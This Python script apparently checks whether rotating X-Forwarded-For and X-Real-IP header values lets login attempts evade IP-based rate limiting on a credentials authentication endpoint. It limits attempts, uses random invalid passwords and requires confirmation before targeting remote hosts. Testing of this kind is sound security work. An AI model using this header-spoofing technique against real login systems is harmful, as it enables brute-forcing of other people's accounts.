#!/usr/bin/env python3
"""
Rate Limit Bypass Test Script
Tests whether rotating X-Forwarded-For headers can bypass IP-based rate limiting
on the authentication endpoint.
"""

import requests
import os
import secrets
import time
from urllib.parse import urlparse

TARGET_BASE_URL = os.environ.get("TARGET_BASE_URL", "").strip().rstrip("/")
EMAIL = os.environ.get("TEST_EMAIL", "").strip()
if not TARGET_BASE_URL or not EMAIL:
    raise SystemExit("TARGET_BASE_URL and TEST_EMAIL are required")

parsed_target = urlparse(TARGET_BASE_URL)
local_hostnames = {"localhost", "127.0.0.1", "::1"}
if parsed_target.scheme not in {"http", "https"} or not parsed_target.hostname:
    raise SystemExit("TARGET_BASE_URL must be an absolute http(s) origin")
if parsed_target.username or parsed_target.password or parsed_target.path not in {"", "/"} or parsed_target.query or parsed_target.fragment:
    raise SystemExit("TARGET_BASE_URL must not contain credentials, a path, query, or fragment")
if parsed_target.hostname in local_hostnames and os.environ.get("NODE_ENV") == "production":
    raise SystemExit("Local rate-limit targets are blocked when NODE_ENV=production")
if parsed_target.hostname not in local_hostnames:
    if parsed_target.scheme != "https":
        raise SystemExit("Remote rate-limit targets must use HTTPS")
    if os.environ.get("CONFIRM_REMOTE_RATE_LIMIT_TEST") != parsed_target.hostname:
        raise SystemExit(f"Set CONFIRM_REMOTE_RATE_LIMIT_TEST={parsed_target.hostname} to target this remote host")

try:
    ATTEMPTS = int(os.environ.get("RATE_LIMIT_TEST_ATTEMPTS", "6"))
except ValueError as exc:
    raise SystemExit("RATE_LIMIT_TEST_ATTEMPTS must be an integer from 2 through 10") from exc
if ATTEMPTS < 2 or ATTEMPTS > 10:
    raise SystemExit("RATE_LIMIT_TEST_ATTEMPTS must be from 2 through 10")

TARGET_AUTH = f"{TARGET_BASE_URL}/api/auth/callback/credentials"
CSRF_URL = f"{TARGET_BASE_URL}/api/auth/csrf"
PASSWORD = f"Invalid-Aa1!{secrets.token_urlsafe(18)}"
CALLBACK_URL = "/"

def fetch_csrf_token():
    """Fetch a fresh CSRF token from the auth endpoint."""
    resp = requests.get(CSRF_URL, timeout=10)
    data = resp.json()
    token = data.get("csrfToken", "")
    print(f"  [CSRF] Token acquired: {bool(token)}")
    return token

def send_login_attempt(ip, csrf_token, attempt_num):
    """Send a single login attempt with the given X-Forwarded-For IP."""
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "User-Agent": "Mozilla/5.0 (SecurityTest)",
    }
    payload = (
        f"email={requests.utils.quote(EMAIL)}"
        f"&password={requests.utils.quote(PASSWORD)}"
        f"&csrfToken={requests.utils.quote(csrf_token)}"
        f"&callbackUrl={requests.utils.quote(CALLBACK_URL)}"
        f"&json=true"
    )
    resp = requests.post(TARGET_AUTH, headers=headers, data=payload, timeout=10, allow_redirects=False)
    print(f"  [{attempt_num:02d}] IP={ip:<15} Status={resp.status_code}")
    return resp.status_code

def run_batch(label, ips, csrf_token):
    """Run a batch of login attempts and return list of status codes."""
    print(f"\n{'='*70}")
    print(f"BATCH: {label}")
    print(f"{'='*70}")
    statuses = []
    for i, ip in enumerate(ips, start=1):
        status = send_login_attempt(ip, csrf_token, i)
        statuses.append(status)
        time.sleep(0.3)  # small delay to avoid connection flooding
    return statuses

def main():
    print("=" * 70)
    print("  Authentication Rate Limit Bypass Test")
    print("  Target:", TARGET_AUTH)
    print("=" * 70)

    # ------------------------------------------------------------------ #
    # BATCH 1: Same IP — should trigger rate limiting                    #
    # ------------------------------------------------------------------ #
    print("\n[*] Fetching CSRF token for Batch 1...")
    csrf1 = fetch_csrf_token()

    same_ip = "192.168.1.1"
    same_ip_list = [same_ip] * ATTEMPTS

    statuses_same = run_batch(f"{ATTEMPTS} requests from SAME IP (192.168.1.1)", same_ip_list, csrf1)

    # ------------------------------------------------------------------ #
    # BATCH 2: Rotating IPs — should NOT be limited                      #
    # ------------------------------------------------------------------ #
    print("\n[*] Fetching fresh CSRF token for Batch 2...")
    csrf2 = fetch_csrf_token()

    rotating_ips = [f"1.2.3.{i}" for i in range(1, ATTEMPTS + 1)]

    statuses_rotating = run_batch(f"{ATTEMPTS} requests with ROTATING IPs", rotating_ips, csrf2)

    # ------------------------------------------------------------------ #
    # SUMMARY                                                              #
    # ------------------------------------------------------------------ #
    same_429_count    = statuses_same.count(429)
    rotating_429_count = statuses_rotating.count(429)

    rate_limit_triggered = same_429_count > 0
    bypass_confirmed     = rate_limit_triggered and rotating_429_count == 0

    print(f"\n{'='*70}")
    print("  SUMMARY")
    print(f"{'='*70}")
    print(f"  Batch 1 (same IP)      : {len(statuses_same)} requests | 429s received: {same_429_count}")
    print(f"  Batch 2 (rotating IPs) : {len(statuses_rotating)} requests | 429s received: {rotating_429_count}")
    print()

    if rate_limit_triggered:
        print("  [TRIGGERED] Rate limit WAS triggered with the same IP.")
    else:
        print("  [NOT TRIGGERED] Rate limit was NOT triggered with the same IP.")
        print("                  (Server may not enforce IP-based rate limiting at all,")
        print("                   or the threshold is higher than 15 requests.)")

    if bypass_confirmed:
        print("  [BYPASS CONFIRMED] Rotating IPs bypassed the rate limit — VULNERABILITY CONFIRMED.")
    elif rate_limit_triggered and rotating_429_count > 0:
        print(f"  [BYPASS FAILED] Rotating IPs still received {rotating_429_count} x 429 — bypass did NOT work.")
    else:
        print("  [INCONCLUSIVE] Rate limit was not triggered in Batch 1; bypass test is not meaningful.")

    print(f"{'='*70}\n")

if __name__ == "__main__":
    main()
